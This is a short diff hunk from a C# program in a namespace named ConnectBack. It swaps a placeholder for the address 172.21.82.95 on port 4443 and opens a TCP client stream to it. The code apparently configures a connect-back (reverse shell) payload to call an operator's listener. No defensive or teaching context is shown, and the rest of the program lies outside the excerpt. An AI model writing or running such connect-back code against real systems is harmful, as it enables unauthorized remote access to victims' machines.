@@ -23,7 +23,7 @@ namespace ConnectBack
 
 		public static void Main(string[] args)
 		{
-			using(TcpClient client = new TcpClient("IP Address", 4443))
+			using(TcpClient client = new TcpClient("172.21.82.95", 4443))
 			{
 				using(Stream stream = client.GetStream())
 				{
